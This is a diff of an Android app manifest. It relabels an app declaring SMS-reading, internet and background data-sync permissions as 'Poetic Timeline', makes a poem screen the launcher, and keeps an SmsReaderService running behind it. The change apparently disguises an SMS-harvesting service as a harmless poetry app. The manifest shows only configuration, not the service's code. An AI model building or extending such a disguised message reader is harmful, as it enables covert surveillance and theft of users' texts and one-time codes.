@@ -2,48 +2,50 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     package="com.dawillygene.venlitgenexombiev2">
 
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" /> <!-- For foreground services if needed -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
-
-
-    <uses-permission android:name="android.permission.INTERNET" />
-    <!-- Required permission to read SMS -->
+    <uses-permission android:name="android.permission.INTERNET" /> <!-- Required permission to read SMS -->
     <uses-feature
         android:name="android.hardware.telephony"
         android:required="false" />
-    <uses-permission android:name="android.permission.READ_SMS" />
 
-    <!-- Required for exact alarms (for Android 12+) -->
-    <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM"
+    <uses-permission android:name="android.permission.READ_SMS" /> <!-- Required for exact alarms (for Android 12+) -->
+    <uses-permission
+        android:name="android.permission.SCHEDULE_EXACT_ALARM"
         android:maxSdkVersion="30" />
-
-    <!-- For foreground services if needed -->
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
 
     <application
         android:allowBackup="true"
         android:icon="@drawable/android_servive"
-        android:label="Android service"
+        android:label="Poetic Timeline"
         android:roundIcon="@drawable/android_servive"
         android:supportsRtl="true"
-        android:theme="@style/Theme.AppCompat.Light.DarkActionBar"> <!-- Add this line -->
+        android:theme="@style/Theme.AppCompat.Light.DarkActionBar">
+        <activity
+            android:name=".Poem.PomeMainActivity"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
 
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+        <!-- Add this line -->
         <!-- Main Activity Declaration -->
         <activity
             android:name=".MainActivity"
             android:exported="true">
-            <intent-filter>
-                <action android:name="android.intent.action.MAIN" />
-                <category android:name="android.intent.category.LAUNCHER" />
-            </intent-filter>
-        </activity>
+<!--            <intent-filter>-->
+<!--                <action android:name="android.intent.action.MAIN" />-->
 
-        <!-- Service Declaration -->
+<!--                <category android:name="android.intent.category.LAUNCHER" />-->
+<!--            </intent-filter>-->
+        </activity> <!-- Service Declaration -->
         <service
             android:name=".SmsReaderService"
             android:exported="false"
             android:foregroundServiceType="dataSync" />
-
     </application>
 
 </manifest>
